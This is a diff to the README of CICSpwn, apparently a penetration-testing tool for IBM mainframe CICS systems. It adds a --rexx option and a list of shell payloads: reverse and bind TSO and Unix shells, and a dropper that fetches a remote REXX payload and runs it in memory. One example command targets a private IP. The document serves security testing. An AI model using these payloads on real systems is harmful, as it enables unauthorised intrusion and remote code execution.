@@ -88,7 +88,9 @@ JOB options:
                         Remote server to call back to for reverse shell
                         (host:port)
   --port PORT           Remote port to open for bind shell in REXX
-  -j JCL, --jcl JCL     Custom JCL file to provide
+  --jcl JCL             Custom JCL file to provide
+  --rexx REXX_FILE      Custom REXX file to execute in memory. No label or
+                        line continuation must be present in the file
 
 ```
 ## Prerequisites
@@ -180,6 +182,16 @@ root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -s reverse_tso -l 1
 	[*] JCL Written to TDqueue, it should be executed any second
 
 ```
+## Available shell payloads
+* **Reverse_tso**: spawns a reverse tso shell to the host specified by --lhost ip:port option.
+* **direct_tso**: same as reverse_tso but binds the shell to --port option
+* **reverse_unix**: spawns a reverse unix shell to the host specified by --lhost ip:port option.
+* **direct_unix**: same as reverse_unix but binds the shell to --port option
+* **ftp**: connects to a remote ftp server specified by --lhost ip:port and executes commands specified in file --ftp-cmds
+* **reverse_rexx**: writes a dropper to disk that fetches a rexx payload  from --lhost ip:port and executes it in memory. The listener is handled by CICSpwn. The only constraint is that the rexx file must not contain labels or continuation lines
+* **custom**: sends a custom JCL specified by --jcl option
+* **dummy**: executes ftp to --lhost ip:port to make sure reverse connection is possible
+
 
 ## Copyright and license  
 CICSpwn is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.  
@@ -189,7 +201,8 @@ See the GNU General Public License for more details.
 You should have received a copy of the GNU General Public License along with nmaptocsv. If not, see http://www.gnu.org/licenses/.
 
 ## Credit
-The REXX code of the reverse shell was mainly inspired by the work of [@mainframed767](https://github.com/mainframed/Mainframed)
+The REXX code of the direct/reverse shell was mainly inspired by the work of [@mainframed767](https://github.com/mainframed/Mainframed)
+Py3270 wrapper class was provided by [@singe](https://github.com/sensepost/birp)
 
 ## Contact
 Ayoub ELAASSAL ayoul3.zos at gmail dot com
